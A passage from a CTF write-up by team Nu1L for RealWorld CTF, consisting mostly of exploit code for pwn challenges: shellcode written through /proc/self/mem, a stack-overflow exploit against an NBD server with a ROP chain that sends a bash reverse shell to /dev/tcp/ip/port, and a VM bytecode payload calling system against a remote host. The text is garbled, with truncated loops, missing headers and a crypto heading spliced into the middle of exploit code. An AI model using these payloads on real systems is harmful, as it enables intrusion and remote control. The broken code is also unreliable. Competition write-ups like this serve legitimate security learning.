RealWorld CTF WriteUp By Nu1L
RealWorld CTF WriteUp By Nu1L
Pwn
QLaaS
Who Moved My Block
SVME
Crypto
Treasure Hunter
WEB
RWDN
Hack into Skynet
Pwn
QLaaS
可以修改/proc/self/mem
#include 
#include 
#include 
#include 
#include
#include      
typedef unsigned long long u64;
const unsigned char sc[]={106, 103, 72, 184, 47, 114, 101, 97, 100, 102, 108, 97, 80, 
72, 137, 231, 49, 210, 49, 246, 106, 59, 88, 15, 5};
char buffer[0x4000];
int main(){
  char* x=malloc(0x3fff000);
  for(int i=0;i0):
        data = sh.recv(datasize)
    # print(len(data))
    # print("opt: %d, reply_type: %d, datasize: %d, data: %s"%(opt, reply_type, 
datasize, data))
    return opt, reply_type, datasize, data
def Test(sh):
    try:
        sh.send(p64(0x49484156454f5054)[::-1])  # magic
        sh.send(p32(0xFFFF)[::-1])        # opt
        sh.send(p32(0)[::-1])
        sh.send(p32(0)[::-1])
        magic = p64(0x3e889045565a9)[::-1]
        if(sh.recv(8)==magic):
            return True
    except EOFError:
        return False
    return True
def Overflow(sh, exp):
    sh.recvuntil(p64(0x49484156454f5054)[::-1])
    sh.recv(2)
    sh.send(p32(0x3)[::-1]) #cflags
    sh.send(p64(0x49484156454f5054)[::-1])  # magic
    sh.send(p32(6)[::-1])        # opt
    sh.send(p32(len(exp)+4)[::-1])   # request len
    sh.send(p32(len(exp)+1)[::-1])   # name len
    RecvReply(sh)
    sh.send(exp)
    sh.send('\x00'*(len(exp)+1))
    sh.send(p16(0)[::-1])   # n_requests
    RecvReply(sh)
    RecvReply(sh)  
res = -1
def Brute16(prefix, idx):
    global res
    for i in range(0, 16):
        if(res!=-1):
            return
        sh =  Connect()
        exp = prefix+chr((idx")
sh = Connect()
pop_rdi = 0x0000000000004a58+elf.address
read_got = elf.got['read']
system_plt = elf.plt['system']
def csu(func,rdi,rsi,rdx):
    payload = p64(elf.address+0xc2aa)
    payload += 
p64(0)+p64(1)+p64(rdi)+p64(rsi)+p64(rdx)+p64(func)+p64(elf.address+0xc290)
    payload += p64(0)*7
    return payload
exp = 'A'*0x408+canary+cyclic(0x38)+csu(read_got,4,elf.bss(0x500),0x100)
exp += p64(pop_rdi)+p64(elf.bss(0x500))+p64(system_plt)
Overflow(sh,exp)
sh.send('bash -c "bash -i >& /dev/tcp/ip/port 0>&1"')
sh.interactive()
from pwn import *
NOOP    = 0
IADD    = 1   # int add
ISUB    = 2
IMUL    = 3
ILT     = 4   # int less than
IEQ     = 5   # int equal
BR      = 6   # branch
BRT     = 7   # branch if true
BRF     = 8   # branch if true
ICONST  = 9   # push constant integer
LOAD    = 10  # load from local context
GLOAD   = 11  # load from global memory
STORE   = 12  # store in local context
GSTORE  = 13  # store in global memory
PRINT   = 14  # print stack top
POP     = 15  # throw away top of stack
CALL    = 16  # call function at address with nargs,nlocals
RET     = 17  # return value from function
HALT    = 18
def push(num):
    opcode = b''
    opcode += p32(ICONST)+p32(num)
    return opcode
def pop():
    return p32(POP)
def pr():
    return p32(PRINT)
def gload(addr):
    opcode = p32(GLOAD)+p32(addr)
    return opcode
def gstore(addr):
    opcode = p32(GSTORE)+p32(addr)
    return opcode
def store(offset):
    opcode = p32(STORE)+p32(offset)
    return opcode
def load(offset):
    opcode = p32(LOAD)+p32(offset)
    return opcode
def add():
    return p32(IADD)
def sub():
    return p32(ISUB)
# s = process("./svme")
s = remote("47.243.140.252","1337")
# gdb.attach(s,"b *$rebase(0x19bf)\nc")
pop_rdi = 0x0000000000026b72
sh = 0x001b75aa
libc = ELF("../libc-2.31.so")
system = libc.sym['system']
idx = -0x90
payload = b''
payload += gload(-0x83f&0xffffffff)+gload(-0x840&0xffffffff)+push(0x218)+add()  #get 
stack 
payload += store(-0x3e1&0xffffffff)+store(-0x3e0&0xffffffff)                    #set 
global to stack
Crypto
Treasure Hunter
源码
payload += gload(0)+push(0x270b3)+sub()+store(0)
payload += gload(1)+store(1)
payload += 
load(0)+push(pop_rdi)+add()+gstore(idx&0xffffffff)+load(1)+gstore((idx+1)&0xffffffff)
payload += 
load(0)+push(sh)+add()+gstore((idx+2)&0xffffffff)+load(1)+gstore((idx+3)&0xffffffff)
payload += 
load(0)+push(pop_rdi+1)+add()+gstore((idx+4)&0xffffffff)+load(1)+gstore((idx+5)&0xfffff
fff)
payload += 
load(0)+push(system)+add()+gstore((idx+6)&0xffffffff)+load(1)+gstore((idx+7)&0xffffffff
)
payload += p32(HALT)
payload = payload.ljust(4*128,b'\x00')
s.send(payload)
s.interactive()
SparseMerkleTree.sol
pragma solidity >=0.8.0 <0.9.0;
uint256 constant SMT_STACK_SIZE = 32;
uint256 constant DEPTH = 160;
library SMT {
    struct Leaf {
        address key;
        uint8 value;
    }
    enum Mode {
        BlackList,
        WhiteList
    }
    enum Method {
        Insert,
        Delete
    }
    function init() internal pure returns (bytes32) {
        return 0;
    }
    function calcLeaf(Leaf memory a) internal pure returns (bytes32) {
        if (a.value == 0) {
            return 0;
        } else {
            return keccak256(abi.encode(a.key, a.value));
        }
    }
    function merge(bytes32 l, bytes32 r) internal pure returns (bytes32) {
        if (l == 0) {
            return r;
        } else if (r == 0) {
            return l;
        } else {
            return keccak256(abi.encode(l, r));
        }
    }
    function verifyByMode(
        bytes32[] memory _proofs,
        address[] memory _targets,
        bytes32 _expectedRoot,
        Mode _mode
    ) internal pure returns (bool) {
        Leaf[] memory leaves = new Leaf[](_targets.length);
        for (uint256 i = 0; i < _targets.length; i++) {
            leaves[i] = Leaf({key: _targets[i], value: uint8(_mode)});
        }
        return verify(_proofs, leaves, _expectedRoot);